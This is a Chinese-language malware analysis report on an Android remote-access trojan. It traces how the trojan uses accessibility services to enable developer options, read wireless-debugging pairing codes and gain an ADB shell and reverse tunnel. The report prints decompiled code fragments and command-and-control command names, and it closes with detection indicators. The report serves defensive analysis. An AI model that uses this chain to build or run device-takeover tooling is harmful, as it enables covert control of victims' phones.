# Tiangong RAT — ADB 配对自动化触发条件分析

> **样本**: update.apk (tiangong RAT)
> **核心文件**: `jadx-reference/rock/service/modules/setup/C0360a2.java` (SystemOptimizeManager, 5666 行)
> **命令路由**: `jadx-reference/rock/service/modules/command/C0343a0.java` (AdbTunnelCommandHandler)
> **调度器**: `jadx-reference/p000/c41.java` (ScheduledExecutor task router)
> **日期**: 2026-04-17


---

## 一、结论先行

ADB WiFi 配对的触发**不是单一入口**，而是一个**多路触发 + 事件驱动 + 机会主义**的设计。

4 条独立触发路径全部汇聚到同一个执行入口 `startPairFlow()` (`m212093k3`)：

| 触发路径 | 类型 | 触发条件 | 需要 C2 干预 |
|---------|------|---------|:----------:|
| **路径 1**: C2 远程命令 | 主动触发 | C2 下发 `START_PAIRING` 等命令 | **是** |
| **路径 2**: 权限自动化完成回调 | **自动衔接** | yw5xud 完成 → 开发者选项开启 → onComplete | **否** |
| **路径 3**: AccessibilityEvent 被动监听 | 机会主义 | 用户自己进入开发者选项/无线调试 | **否** |
| **路径 4**: 心跳维护循环 H() | 恢复触发 | local-service 掉线 + 无线调试关闭 | **否** |

> **首次后最常见的触发方式是路径 2**——用户开启无障碍服务后，全部流程（权限获取 → 开发者选项 → ADB 配对 → 部署）完全自动化，无需 C2 介入。

---

## 二、触发路径全景图

```
┌──────────────────────────────────────────────────────────────────────┐
│                          触发层                                      │
│                                                                      │
│  路径 1: C2 远程命令下发 ──────────────── 主动触发                    │
│  ├─ "START_PAIRING"          → handleStartPairing → m212095k5()     │
│  ├─ "AUTO_WIRELESS_PAIRING"  → 同上                                  │
│  ├─ "FULL_DEPLOY"            → forceStart() → 权限流程 → k3()       │
│  └─ "DIRECT_PAIR"            → 直接读屏幕配对码 → m212054e2()       │
│                                                                      │
│  路径 2: 开发者选项自动化完成回调 ──── 自动衔接     │
│  └─ yw5xud 权限自动化完成                                            │
│     → OpenDevelopmentDelegate 开启开发者选项                         │
│     → onComplete 回调 → m212093k3()                                 │
│                                                                      │
│  路径 3: AccessibilityEvent 被动触发 ── 机会主义                     │
│  └─ 检测到用户自己进入开发者选项/无线调试页面                         │
│     → onAccessibilityEventInternal                                   │
│     → pairInDevOption / pairInWifiDebugWindow                        │
│                                                                      │
│  路径 4: 心跳维护循环 H() ────────── 恢复触发                       │
│  └─ local-service 未运行 + 无线调试关闭                              │
│     → m212097k7() 尝试重新开启无线调试                               │
│     → c41(case 8/9/10) → m212093k3()                               │
│                                                                      │
└────────────────────────┬─────────────────────────────────────────────┘
                         │
                         ▼
┌──────────────────────────────────────────────────────────────────────┐
│                     统一执行入口                                      │
│                                                                      │
│  m212093k3() = startPairFlow()                                       │
│  ├─ f53823a8.set(true)   // 启用配对事件监听                         │
│  ├─ f53822a7.set(false)  // 清除完成标记                             │
│  ├─ schedule(timeout=120s) // 2 分钟超时守卫                         │
│  ├─ schedule(check=30s)   // 30 秒状态检查                           │
│  ├─ PairState → UNKNOWN   // 重置状态机                              │
│  └─ 检测当前页面位置:                                                 │
│     ├─ 已在开发者选项 → "pairInDevOption"  → G() 流程                │
│     ├─ 已在无线调试   → "pairInWifiDebugWindow" → W() 流程           │
│     └─ 其他           → openDevOptionsSettingsWithRetry()            │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 三、路径 1：C2 远程命令下发（主动触发）

### 3.1 命令路由

C2 通过 WebSocket (`/ws/session`) 或 Go bridge (`/ws/bridge`) 下发命令，由 `AdbTunnelCommandHandler` (`C0343a0`) 路由。

**命令注册列表** (`C0343a0.java` 行 115)：
```java
return kg1.m213542f1(
    "DEPLOY_LOCAL_SERVICE",
    "START_PAIRING",
    "OPEN_WIFI_DEBUG_SETTINGS",
    "FULL_DEPLOY",
    "OPEN_ABOUT_PHONE",
    "AUTO_WIRELESS_PAIRING",
    "DIRECT_PAIR"
);
```

### 3.2 7 条 C2 命令详解

| C2 命令 | 处理方法 | 效果 | 适用场景 |
|---------|---------|------|---------|
| `START_PAIRING` | `handleStartPairing` → `m212095k5()` | 强制启动配对（跳过前置检查） | 无障碍已开启，手动触发配对 |
| `AUTO_WIRELESS_PAIRING` | 同上 | 自动无线配对 | 等价于 START_PAIRING |
| `FULL_DEPLOY` | `handleFullDeploy` → `forceStart()` | **完整流程**：权限 → 开发者选项 → 配对 → 部署 | 全新设备，从零开始 |
| `DIRECT_PAIR` | `handleDirectPair` → `m212052e0()` | 直接从屏幕读取配对码并执行 SPAKE2 | 用户已手动打开配对码弹窗 |
| `OPEN_WIFI_DEBUG_SETTINGS` | `handleOpenWifiDebugSettings` | 仅打开无线调试设置页面 | 辅助远程操作 |
| `DEPLOY_LOCAL_SERVICE` | `handleDeployLocalService` | 仅部署 local-service（假设已有 ADB 权限） | 已配对但 local-service 丢失 |
| `OPEN_ABOUT_PHONE` | — | 打开"关于手机" | 辅助手动开启开发者选项 |

### 3.3 START_PAIRING 执行代码

**文件**: `AdbTunnelCommandHandler$handleStartPairing$1.java`

```java
@Override
public final Object invokeSuspend(Object obj) {
    try {
        // 回报状态
        C0343a0.m211874a4(uz0Var, "pairing_started", "正在启动配对流程...");

        // 获取 SystemOptimizeManager 单例
        C0360a2 j41Var = C0360a2.f53810f9.getInstance();
        if (j41Var == null) {
            C0343a0.m211874a4(uz0Var, "pairing_failed",
                "服务未初始化，请先开启无障碍服务");
            return c1351vv;
        }

        // 强制触发配对（跳过检查）
        j41Var.m212095k5();

        // 回报触发成功
        C0343a0.m211874a4(uz0Var, "pairing_triggered",
            "配对流程已触发，请等待自动完成...");
    } catch (Exception e) {
        t60.m214705c6("AdbTunnelCmdHandler", "启动配对失败", e);
        C0343a0.m211874a4(uz0Var, "pairing_failed",
            "启动配对失败: " + e.getMessage());
    }
    return c1351vv;
}
```

### 3.4 FULL_DEPLOY 执行链

`FULL_DEPLOY` 是最重量级的命令——从零开始执行完整链：

```
"FULL_DEPLOY" 
  → handleFullDeploy (C0343a0.java 行 133)
  → 回报 "★★★ 收到完整部署命令 ★★★"
  → 重置 pair_completed = false (SharedPreferences)
  → forceStart()
    → yw5xud 权限自动化（如尚未完成）
    → OpenDevelopmentDelegate（开启开发者选项）
    → onComplete → startPairFlow()
    → ADB 配对 → 部署 local-service
  → 成功: 回报 "★★★ 完整部署流程完成 ★★★"
  → 失败: 回报 "★★★ 完整部署流程失败 ★★★"
```

### 3.5 DIRECT_PAIR 执行链

`DIRECT_PAIR` 假设已经手动打开了配对码弹窗：

```
"DIRECT_PAIR"
  → handleDirectPair (C0343a0.java 行 303)
  → 回报 "★★★ 直接配对（读取屏幕配对码）★★★"
  → 初始化 SystemOptimizeManager
  → 获取配对管理器实例
  → 回报 "direct_pair_start" — "正在读取屏幕配对码..."
  → m212052e0()  // 直接调用读码+SPAKE2 配对
  → 成功/失败回报
```

### 3.6 `m212095k5()` vs `m212093k3()` 的区别

| 方法 | 原始名 | 日志 | 调用方 | 差异 |
|------|--------|------|--------|------|
| `m212095k5()` | `forceStartPairFlow` | `"外部触发配对流程"` `"强制开始无线调试配对流程（跳过检查）"` | C2 命令 | 跳过前置检查 |
| `m212093k3()` | `startPairFlow` | `"开始无线调试配对流程"` | 内部回调 | 标准入口 |

两者内部逻辑几乎相同，最终都进入同一个配对执行流程。`k5()` 额外设置 `f53823a8=true` / `f53822a7=false` 并重建 executor（如已关闭）。

### 3.7 C2 状态回报事件

配对过程中向 C2 回报的状态事件：

| 事件 | 含义 | 触发时机 |
|------|------|---------|
| `"pairing_started"` | 正在启动配对流程 | START_PAIRING 收到 |
| `"pairing_triggered"` | 配对流程已触发 | k5() 调用成功 |
| `"pairing_start"` | 开始自动配对 | AUTO_WIRELESS_PAIRING 收到 |
| `"pairing_failed"` | 配对失败 | 无障碍未开启 / 异常 |
| `"direct_pair_start"` | 正在读取屏幕配对码 | DIRECT_PAIR 开始执行 |
| `"direct_pair_failed"` | 直接配对失败 | 配对管理器未初始化 / 异常 |

---

## 四、路径 2：权限自动化完成 → 开发者选项 → 配对（首次主路径）

### 4.1 完整链

这是**首次主要的触发路径**——完全自动化，无需 C2 干预：

```
1. APK 安装
         │
2. 开启无障碍服务
   └─ 用户唯一需要执行的操作
         │
3. AccessibilityService 启动
   └─ AppCoreService.onCreate → 初始化 SystemOptimizeManager
         │
4. yw5xud 按厂商权限自动化（30-60 秒）
   ├─ HuaweiSteps  （华为/荣耀）     ─┐
   ├─ OppoStepsSimplified（OPPO系） ─┤
   ├─ VivoSteps   （vivo/iQOO）     ─┤ 获取: 悬浮窗/自启动/电池白名单
   ├─ MiuiSteps   （小米/Redmi）    ─┤       文件访问/通知监听等
   ├─ SamsungSteps（三星）          ─┤
   ├─ MeizuSteps  （魅族）          ─┤
   └─ GenericSteps（海外通用）      ─┘
         │  所有权限获取完成
         │
5. OpenDevelopmentDelegate 启动（10-20 秒）
   ├─ a. 打开"设置 → 关于手机"
   ├─ b. 连续点击"版本号" 7 次 → 开启开发者选项
   ├─ c. 处理锁屏密码确认弹窗（如果有）
   │     └─ 等待用户输入 / 自动化处理
   └─ d. 返回设置 → 进入"系统和更新 → 开发者选项"
         │  DevOptState → ENABLE_DEV_OPT_SUCCESS
         │
6. onComplete 回调 → m212093k3() (startPairFlow)
         │
7. ADB WiFi 配对执行（5-15 秒）
   ├─ 打开无线调试 → 点击"使用配对码配对设备"
   ├─ 读取配对码 → SPAKE2+TLS 握手 → PeerInfo 交换
   └─ 上传证书 → adb connect
         │
8. 部署 local-service + frpc（10 秒）
   ├─ 复制/下载 local-service 到 /data/local/tmp/
   ├─ chmod 777 → 启动
   └─ 下载 frpc → XOR 解密 → 建立反向隧道
         │
9. ★ 完成 ★
   └─ ADB shell + local-service RPC(300+端点) + frp 隧道
```

### 4.2 触发回调源码

**文件**: `SystemOptimizeManager$startOpenDevelopmentDelegate$1.java`

```java
final class SystemOptimizeManager$startOpenDevelopmentDelegate$1
    extends Lambda implements w00 {

    public final /* synthetic */ C0360a2 f53784a0;

    @Override
    public final Object invoke() {
        t60.m214714d6("SystemOptimize",
            "OpenDevelopmentDelegate 回调 onComplete");

        C0360a2 c0360a2 = this.f53784a0;

        // 标记开发者选项已成功开启
        c0360a2.f53820a5.set(
            SystemOptimizeManager$DevOptState.ENABLE_DEV_OPT_SUCCESS);

        // ★ 自动触发 ADB WiFi 配对
        c0360a2.m212093k3();

        return C1351vv.f60710b1;  // Unit
    }
}
```

### 4.3 关键设计特征

1. **用户唯一操作是开启无障碍服务** — 之后全部自动化
2. **无需网络连接** — 首次全链路可离线完成
3. **全程约 2.5 分钟** — 从无障碍开启到获得完整 shell
4. **仅在 UI 异常时需要 C2** — 某些厂商非标弹窗无法自动处理时

### 4.4 时间线估算

| 时间 | 事件 |
|------|------|
| T+0s | 用户开启无障碍服务 |
| T+1s | yw5xud 权限自动化开始 |
| T+30s | 批量运行时权限授予完成 |
| T+60s | 电池/自启动/悬浮窗/文件等权限完成 |
| T+90s | OpenDevelopmentDelegate 开始 |
| T+100s | 打开"关于手机"，连续点击版本号 7 次 |
| T+110s | 开发者选项开启（可能需密码确认 +10s） |
| T+115s | onComplete → startPairFlow() 触发 |
| T+120s | 打开开发者选项 → 查找"无线调试" → 点击进入 |
| T+125s | 无线调试页面 → 点击"使用配对码配对设备" |
| T+130s | 配对码弹窗 → AccessibilityNodeInfo 读取 port + code |
| T+132s | SPAKE2+TLS 握手 → PeerInfo 交换 → 配对成功 |
| T+135s | 上传证书到 C2 → 读取调试端口 → adb connect |
| T+140s | 部署 local-service → 启动 → frpc 下载+隧道建立 |
| T+150s | ★ 达成 |

---

## 五、路径 3：AccessibilityEvent 被动触发（机会主义）

### 5.1 触发条件

当 RAT 的 `AccessibilityService` 监听到用户**自己**进入了系统设置的开发者选项或无线调试页面时，自动"搭便车"执行配对。

**前提条件**（全部满足才触发）：
- `f53822a7` (isFinished) == **false** — 配对尚未完成
- `f53823a8` (isEnabled) == **true** — 配对功能已启用
- 前台包名含 `"settings"` / `"securitycenter"` / `"systemui"`
- PairState 不在终态（SUCCESS / PREPARE_FINISH / FINISH）

### 5.2 事件监听入口

**方法**: `m212078i3` (onAccessibilityEvent 预处理, 行 3788)

```java
public final void m212078i3(AccessibilityEvent accessibilityEvent) {
    String packageName = accessibilityEvent.getPackageName().toString();

    // 阶段 1: 系统 UI 事件 → 通知窗口检测（DevOptState 推进）
    if (packageName.equals("com.android.systemui")
        || packageName.equals("com.android.settings")) {
        if (eventType == TYPE_WINDOW_STATE_CHANGED
            || eventType == TYPE_WINDOW_CONTENT_CHANGED
            || eventType == TYPE_VIEW_CLICKED) {
            executor.execute(new c41(this, 0));  // DevOptState 状态机
        }
    }

    // 阶段 2: 配对事件监听（需 isEnabled=true 且 isFinished=false）
    if (f53822a7.get() || !f53823a8.get()) {
        return;  // 已完成或未启用 → 不监听
    }

    // 过滤: 只关注系统设置/安全中心/SystemUI
    if (packageName 含 "settings"
        || packageName 含 "securitycenter"
        || packageName 含 "systemui") {
        executor.execute(new e41(this, event, packageName, eventType, className));
    }
}
```

### 5.3 事件处理逻辑

**方法**: `m212079i4` (onAccessibilityEventInternal, 行 3811)

```java
public final void m212079i4(AccessibilityEvent event, String pkg, String cls) {
    // 先委托 DevOptState 处理（如正在开启开发者选项）
    if (devOptState.ordinal < 7 && openDevelopmentDelegate != null) {
        openDevelopmentDelegate.onEvent(event, pkg, cls);
    }

    ConcurrentLinkedQueue queue = this.f53818a3;

    // ━━━━━ 场景 A: 检测到在开发者选项页面 ━━━━━
    if (m212028a2()) {  // isInDevOptionsWindow
        // 清除无关阶段
        queue.remove("pairInWifiDebugWindow");
        queue.remove("pairInPairCodeDialog");
        // ...

        PairState currentState = (PairState) atomicReference.get();
        if (queue.contains("pairInDevOption")) {
            return;  // 已在执行，不重复
        }
        if (currentState != PAIR_SUCCESS
            && currentState != PREPARE_FINISH
            && currentState != PAIR_FINISH) {
            // ★ 触发配对: 从开发者选项页面开始
            queue.add("pairInDevOption");
            m212087j5("G", () -> m211991b0(this));
            // G() = pairInDevOption 流程:
            //   查找"无线调试" → 开启 → 进入 → 配对
        }
        return;
    }

    // ━━━━━ 场景 B: 检测到在无线调试页面 ━━━━━
    if (m212032a6()) {  // isInWifiDebugWindow
        queue.remove("pairInDevOption");
        // ...

        PairState currentState = (PairState) atomicReference.get();
        if (currentState != PAIR_SUCCESS
            && currentState != PREPARE_FINISH
            && currentState != PAIR_FINISH) {
            if (!queue.contains("pairInWifiDebugWindow")) {
                // ★ 触发配对: 从无线调试页面开始
                queue.add("pairInWifiDebugWindow");
                m212087j5("W", () -> m211995b4(this));
                // W() = pairInWifiDebugWindow 流程:
                //   直接点击"使用配对码配对设备" → 读码 → 配对
            }
        }
        return;
    }

    // ━━━━━ 场景 C-F: 其他系统页面检测 ━━━━━
    // pairInPairSuccess — 配对成功后处理
    // pairInPairFailDialog — 配对失败弹窗
    // pairInConfirmLock — 锁屏密码确认
    // pairInSecurityCenter — 安全中心弹窗
}
```

### 5.4 页面检测方法

#### `m212028a2()` — isInDevOptionsWindow (行 1799)

```java
public final boolean m212028a2() {
    AccessibilityNodeInfo root = f53815a0.getRootInActiveWindow();
    // 方式 1: WindowDetector 检测
    if (windowDetector.isInDevOptionsWindow()) return true;
    // 方式 2: 文本搜索
    // 查找含 "开发者选项" / "Developer options" 的文本节点
    // 需要是标题级别的节点（排除列表项中的子文本）
    return found;
}
```

#### `m212032a6()` — isInWifiDebugWindow (行 1936)

```java
public final boolean m212032a6() {
    AccessibilityNodeInfo root = f53815a0.getRootInActiveWindow();
    // 方式 1: WindowDetector 检测
    if (windowDetector.isInWifiDebugWindow()) return true;
    // 方式 2: 文本搜索
    // 查找含 "无线调试" / "Wireless debugging" 的详情文本
    // 需要验证是无线调试详情页（不是列表项）
    return found;
}
```

## 六、路径 4：心跳维护循环 H()（恢复触发）

### 6.1 触发条件

配对/部署成功后，Java 层启动 H() 定时心跳（每 10 秒 via `ScheduledExecutorService`）。当检测到以下条件时触发重新配对：

```
条件 1: local-service 进程不在运行
        → ps -ef | grep "local-service server" 无结果
        → v00.m214888a0() == false

条件 2: 无线调试开关关闭
        → settings get global adb_wifi_enabled != ON
        → m212073h8() == false

条件 3: 已成功部署过
        → SharedPreferences "adb_deploy_enabled" == true
```

三个条件**同时满足**时，触发 `m212097k7()` → 重新开启无线调试 → 重新配对。

### 6.2 心跳循环代码

**方法**: H() 心跳 (行 3476-3530)

```java
// 5 秒定时任务 (c41 case 1)
if (!v00.m214888a0()) {  // local-service 未运行
    // ...
    if (!m212073h8()) {   // 无线调试未开启
        t60.m214714d6(str,
            "【H()】local-service未运行且无线调试关闭，尝试开启无线调试");
        m212097k7();       // 尝试重新开启无线调试
        // → 内部通过 c41(case 8/9/10) → m212093k3() (startPairFlow)
    }
}
```

### 6.3 调度器任务 ID 映射

**文件**: `c41.java` (ScheduledExecutor task router)

| case | 触发时机 | 动作 | 频率 |
|------|---------|------|------|
| 0 | AccessibilityEvent → DevOptState | DevOptState 状态机推进 | 事件驱动 |
| 1 | 心跳 H() | 检测 local-service + 无线调试状态 | 每 5 秒 |
| 2 | openDevOptionsSettingsWithRetry | 重试打开开发者选项 | 500ms 延迟 |
| 3 | 心跳上报 | 稳态心跳检查 | 每 10 秒 |
| 8 | 心跳检测需重新配对 | `m212093k3()` | 触发 |
| 9 | 无线调试恢复尝试 | `m212093k3()` | 触发 |
| 10 | 进程恢复后重新配对 | `m212093k3()` | 触发 |
| 11 | 120 秒超时守卫 | `m212094k4()` — 强制结束 | 一次性 |
| 12 | 30 秒状态检查 | `m212103l3()` — 日志状态 | 一次性 |

### 6.4 恢复场景

| 场景 | 原因 | 恢复方式 |
|------|------|---------|
| 系统 kill 了 local-service | 系统资源回收 / 电池优化 | H() 检测 → 重启 local-service（已有证书不需重新配对） |
| 无线调试被系统关闭 | 重启后 / 系统设置变更 | H() 检测 → m212097k7() 重新开启 → 可能需要重新配对 |
| ADB 证书被撤销 | 用户手动撤销 USB 调试授权 | H() 检测连接失败 → 触发完整重新配对 |
| local-service + 无线调试都丢失 | 设备重启 | H() 检测 → c41(case 8) → m212093k3() 完整重新配对 |

---

## 七、控制标志位与状态管理

### 7.1 核心标志位

| 标志 | 字段 | 类型 | 含义 |
|------|------|------|------|
| **isEnabled** | `f53823a8` | AtomicBoolean | 配对功能是否启用（控制 AccessibilityEvent 监听） |
| **isFinished** | `f53822a7` | AtomicBoolean | 配对是否已完成（停止所有监听和执行） |
| **pairState** | `f53819a4` | AtomicReference\<PairState\> | 8 态配对状态机 |
| **taskQueue** | `f53818a3` | ConcurrentLinkedQueue\<String\> | 当前执行阶段队列 |

### 7.2 标志位生命周期

```
startPairFlow() / 外部触发:
    isEnabled = true     ← 开始监听
    isFinished = false   ← 重置完成标记
    PairState = UNKNOWN  ← 重置状态机

配对执行中:
    isEnabled = true     (持续监听 AccessibilityEvent)
    isFinished = false
    PairState = LEAVE_DEV_OPT → PAIRING → ...

配对完成:
    isFinished = true    ← 停止监听
    PairState = PAIR_FINISH

配对失败:
    PairState = PAIR_FAIL
    → 根据重试策略决定是否 PairState = UNKNOWN 重来
```

### 7.3 任务队列阶段

`ConcurrentLinkedQueue<String> f53818a3` 充当轻量级状态路由器：

| 队列值 | 含义 | 入口方法 | 何时 add | 何时 remove |
|--------|------|---------|---------|------------|
| `"pairInDevOption"` | 在开发者选项页执行 | G() | isInDevOptionsWindow() | 进入无线调试/完成/失败 |
| `"pairInWifiDebugWindow"` | 在无线调试页执行 | W() | isInWifiDebugWindow() | 点击配对按钮/完成/失败 |
| `"pairInPairCodeDialog"` | 配对码弹窗处理 | — | 配对码弹窗检测到 | 读码完成/超时 |
| `"pairInPairSuccess"` | 配对成功后续 | — | SPAKE2 成功 | 部署完成/失败 |
| `"pairInPairFailDialog"` | 配对失败弹窗 | — | 配对失败 | 重试/放弃 |
| `"pairInConfirmLock"` | 锁屏密码确认 | — | 检测到密码弹窗 | 输入完成/超时 |
| `"pairInSecurityCenter"` | 安全中心确认弹窗 | — | 厂商安全弹窗 | 确认/跳过 |
| `"pairInPrepareFinish"` | 准备完成 | — | 配对后续完成 | handleComplete |

---

## 八、`startPairFlow()` 执行入口详解

### 8.1 方法源码

**方法**: `m212093k3` (startPairFlow, 行 5101-5153)

```java
public final void m212093k3() {
    t60.m214714d6("SystemOptimize", "开始无线调试配对流程");

    // 1. 设置控制标志
    this.f53823a8.set(true);   // isEnabled = true
    this.f53822a7.set(false);  // isFinished = false

    // 2. 重建 executor（如已关闭）
    if (this.f53817a2.isShutdown()) {
        t60.m214714d6("SystemOptimize", "executor 已关闭，重新创建");
        this.f53817a2 = Executors.newSingleThreadScheduledExecutor();
    }

    // 3. 定时守卫
    executor.schedule(c41(11), 120L, SECONDS);  // 2 分钟超时
    executor.schedule(c41(12), 30L, SECONDS);   // 30 秒状态检查

    // 4. 重置状态机
    this.f53819a4.set(PairState.PAIR_UNKNOWN);

    // 5. 延迟 500ms 后检测当前页面
    m212025k1(5);  // sleep 500ms

    // 6. 根据当前页面决定入口
    if (m212028a2()) {
        // 已在开发者选项页面 → 直接查找无线调试
        t60.m214714d6("SystemOptimize", "已在开发者选项页面，直接查找无线调试");
        this.f53818a3.add("pairInDevOption");
        m212087j5("G", () -> m211991b0(this));  // G() 流程
    }
    else if (m212032a6()) {
        // 已在无线调试页面 → 直接开始配对
        t60.m214714d6("SystemOptimize", "已在无线调试页面，直接开始配对");
        this.f53818a3.add("pairInWifiDebugWindow");
        m212087j5("W", () -> m211995b4(this));  // W() 流程
    }
    else {
        // 不在设置页面 → 打开开发者选项
        t60.m214714d6("SystemOptimize", "不在设置页面，打开开发者选项");
        m212081i6();  // openDevOptionsSettingsWithRetry
    }
}
```

### 8.2 openDevOptionsSettingsWithRetry

**方法**: `m212081i6` (行 4696-4745)

打开开发者选项设置页面，带重试：

```java
public final void m212081i6() {
    int attempt = ++this.f53833b8;
    t60.m214714d6("SystemOptimize", "打开开发者选项 (第" + attempt + "次)");

    m212080i5();  // 发送 Intent 打开开发者选项

    if (m212028a2()) {
        // 成功进入开发者选项
        t60.m214714d6("SystemOptimize", "开发者选项页面打开成功");
        this.f53833b8 = 0;
        this.f53818a3.add("pairInDevOption");
        m212087j5("G", () -> m211991b0(this));
    }
    else if (m212032a6()) {
        // 直接进入了无线调试页面
        t60.m214714d6("SystemOptimize", "直接进入了无线调试页面");
        this.f53833b8 = 0;
        this.f53818a3.add("pairInWifiDebugWindow");
        m212087j5("W", () -> m211995b4(this));
    }
    else if (attempt < maxRetries) {
        // 未成功，500ms 后重试
        t60.m214726f4("SystemOptimize", "开发者选项页面未打开，500ms后重试");
        executor.schedule(c41(2), 500L, MILLISECONDS);
    }
    else {
        // 达到最大重试次数
        t60.m214704c5("SystemOptimize",
            "开发者选项页面打开失败 (已重试 " + attempt + " 次)");
    }
}
```

---

## 九、完成回调链

配对成功后的完成回调链：

```
SPAKE2 配对成功
  → PairState = PAIR_SUCCESS
  → 上传证书到 C2 (m212100l0)
  → 同步 ADB 配置到 local-service (/syncADBConfig)
  → 从屏幕读取调试端口 (m212021i7)
  → 部署 local-service (m212096k6)
  → m212026a0() — finishLocalAdbPair
    ├─ isFinished = true
    ├─ PairState = PAIR_FINISH
    ├─ 清空任务队列
    ├─ 关闭 executor
    └─ m212067h1() — handleComplete
      ├─ 隐藏无障碍遮盖
      ├─ SharedPreferences:
      │   pair_completed = true
      │   adb_deploy_enabled = true
      ├─ 通知 local-service 服务器配置 (m212092k2)
      ├─ 启动 5 秒心跳定时任务 (H() 循环)
      ├─ 执行返回键退出设置 (最多 5 次 BACK)
      └─ 调用 onComplete 回调 (f53829b4)
```

---

## 十、检测特征

### 10.1 C2 命令特征

```
# AdbTunnelCommandHandler 支持的命令（网络层 IOC）
"DEPLOY_LOCAL_SERVICE"
"START_PAIRING"
"OPEN_WIFI_DEBUG_SETTINGS"
"FULL_DEPLOY"
"OPEN_ABOUT_PHONE"
"AUTO_WIRELESS_PAIRING"
"DIRECT_PAIR"

# C2 状态回报事件
"pairing_started"
"pairing_triggered"
"pairing_failed"
"direct_pair_start"
"direct_pair_failed"
```

### 10.2 日志特征（Logcat）

```
# 配对触发
"开始无线调试配对流程"
"外部触发配对流程"
"强制开始无线调试配对流程（跳过检查）"
"OpenDevelopmentDelegate 回调 onComplete"

# 页面检测
"已在开发者选项页面，直接查找无线调试"
"已在无线调试页面，直接开始配对"
"不在设置页面，打开开发者选项"

# C2 命令
"★★★ 收到手动配对命令 ★★★"
"★★★ 收到完整部署命令 ★★★"
"★★★ 直接配对（读取屏幕配对码）★★★"
"★★★ 自动无线配对 ★★★"

# 心跳恢复
"【H()】local-service未运行且无线调试关闭，尝试开启无线调试"
```


## 十一、与其他模块的交叉关联

| 模块 | 与配对触发的关系 |
|------|----------------|
| **yw5xud 权限自动化** | 完成后触发 OpenDevelopmentDelegate → 路径 2 主入口 |
| **OpenDevelopmentDelegate** | 开启开发者选项 → onComplete → startPairFlow() |
| **DataSyncClient (WebSocket)** | 接收 C2 命令 → AdbTunnelCommandHandler → 路径 1 |
| **local-service (Go)** | `/requestLocalAdbPair` 端点接收委托配对 |
| **HttpManager** | 上传 ADB 证书 (`/api/adb-keys/{deviceId}`) |
| **H() 心跳循环** | 检测 local-service 存活 → 路径 4 恢复触发 |
| **AccessibilityService** | 事件监听 → 路径 3 机会主义触发 |
